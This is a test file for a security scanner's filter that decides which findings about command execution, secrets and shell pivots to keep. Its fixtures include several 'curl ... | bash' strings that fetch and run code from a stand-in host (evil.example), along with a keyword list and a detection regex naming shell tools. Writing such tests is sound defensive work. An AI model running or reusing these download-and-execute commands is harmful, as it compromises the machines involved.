import { describe, expect, it } from 'vitest';
import { classifyFinding } from './semantic_filter';

const prod = 'src/app/api/route.ts';

describe('semantic filter: exec-family fail-closed guard', () => {
  it('exec with a string literal is kept', () => {
    const r = classifyFinding(
      { type: 'OS_COMMAND', severity: 'CRITICAL', category: 'malware', file: prod, line: 1 },
      ["exec('curl -s https://evil.example/p | bash');"],
    );
    expect(r.keep).toBe(true);
  });

  it('string assigned to a variable then exec is kept', () => {
    const r = classifyFinding(
      { type: 'OS_COMMAND', severity: 'CRITICAL', category: 'malware', file: prod, line: 1 },
      ['const x = "curl -s https://evil.example/p | bash"; exec(x);'],
    );
    expect(r.keep).toBe(true);
  });

  it('string assigned on one line, exec on another is kept (fail-closed)', () => {
    const r = classifyFinding(
      { type: 'OS_COMMAND', severity: 'CRITICAL', category: 'malware', file: 'src/worker.ts', line: 3 },
      [
        "const cmd = 'curl -s https://evil.example/p | bash';",
        '',
        "const { exec } = require('child_process');",
        'exec(cmd);',
      ],
    );
    expect(r.keep).toBe(true);
  });

  it('string only logged is dropped', () => {
    const r = classifyFinding(
      { type: 'NETWORK_ACTIVITY', severity: 'LOW', category: 'generic', file: 'src/lib/util.ts', line: 2 },
      ["const x = 'curl evil | bash';", 'console.log(x);'],
    );
    expect(r.keep).toBe(false);
  });

  it('keyword list in a file without an exec-family sink is dropped', () => {
    const r = classifyFinding(
      { type: 'NETWORK_ACTIVITY', severity: 'LOW', category: 'generic', file: 'src/lib/scanner/registry_manifest.ts', line: 1 },
      ["const TOKENS = ['curl', 'wget', 'eval', 'sh', 'bash', 'node -e', 'fetch'];"],
    );
    expect(r.keep).toBe(false);
  });

  it('a string list that is not an exec-family sink never counts as one', () => {
    const r = classifyFinding(
      { type: 'NETWORK_ACTIVITY', severity: 'LOW', category: 'generic', file: 'src/lib/scanner/registry_manifest.ts', line: 1 },
      ["const TOKENS = ['exec', 'eval', 'spawn', 'child_process'];"],
    );
    expect(r.keep).toBe(false);
  });
});

describe('semantic filter: existing guarantees', () => {
  it('test/fixture path drops even with exec string', () => {
    const r = classifyFinding(
      { type: 'WORKFLOW_RISK', severity: 'CRITICAL', category: 'workflow', file: 'src/__tests__/engine/registry_manifest.test.ts', line: 1 },
      ["const cmd = 'curl evil | bash'; exec(cmd);"],
    );
    expect(r.keep).toBe(false);
  });

  it('detector regex definition is dropped', () => {
    const r = classifyFinding(
      { type: 'SHELL_PIVOT', severity: 'CRITICAL', category: 'workflow', file: prod, line: 1 },
      ["{ regex: /curl\\s+.*\\|\\s*(?:bash|sh)|wget.*-O-\\s*\\|/, type: 'SHELL_PIVOT' }"],
    );
    expect(r.keep).toBe(false);
  });

  it('secret inside a string is kept', () => {
    const r = classifyFinding(
      { type: 'SECRET_TOKEN', severity: 'HIGH', category: 'secret', file: 'src/env.ts', line: 5 },
      ['const key = "sk-live-abc123";'],
    );
    expect(r.keep).toBe(true);
  });

  it('comment-only finding is dropped', () => {
    const r = classifyFinding(
      { type: 'OS_CAPABILITY', severity: 'MEDIUM', category: 'generic', file: prod, line: 1 },
      ["// OS_COMMAND: require('child_process') is a capability signal"],
    );
    expect(r.keep).toBe(false);
  });
});
